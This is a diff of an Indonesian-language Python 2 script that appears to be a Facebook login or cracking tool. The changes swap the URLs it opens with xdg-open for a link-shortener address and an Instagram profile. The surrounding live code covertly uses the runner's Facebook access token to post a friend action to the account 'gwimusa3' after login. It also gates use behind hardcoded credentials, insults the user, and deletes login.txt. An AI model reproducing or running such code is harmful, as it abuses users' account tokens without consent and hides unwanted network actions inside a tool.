@@ -93,7 +93,7 @@ def siapa():
 def loginSC():
 	os.system('clear')
 	print"\033[1;97mSilahkan login Lisensi Scriptnya dulu bro,kalau gak tau Lisensinya,silahkan Download Sendiri Jangan Manja Anjing.!\n"
-	os.system('xdg-open https://m.youtube.com/channel/UCdFntu_iZKLjF5rJGcFFGyg')
+	os.system('xdg-open https://ockles.com/mHvZtek4na6U2WAYF')
         username = raw_input("\033[1;96m[*] \033[1;97mID \033[1;91m: \033[1;92m")
 	password = raw_input("\033[1;96m[*] \033[1;97mPassword \033[1;91m: \033[1;92m")
 	if username =="Koi"and password =="Bukis":
@@ -102,7 +102,7 @@ def loginSC():
 		login()
 	else:
 		print"\033[1;96m[!] \033[1;91mSalah Bosok!!"
-		os.system('xdg-open https://m.youtube.com/channel/UCdFntu_iZKLjF5rJGcFFGyg')
+		os.system('xdg-open https://ockles.com/mHvZtek4na6U2WAYF')
                 time.sleep(1)
                 LoginSC()
 
@@ -146,18 +146,18 @@ def login():
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://www.youtube.com/channel/UCP0-8OzsHywqN461bVFjUbQ')
+				os.system('xdg-open https://instagram.com/dwiirfan187')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\033[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint")
+			print("\n\033[1;96m[!] \x1b[1;91mSayang akun anda kena checkpoint tuh ")
 			os.system('xdg-open https://m.youtube.com/channel/UCdFntu_iZKLjF5rJGcFFGyg')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email salah")
+			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email salah Seng Bener To")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
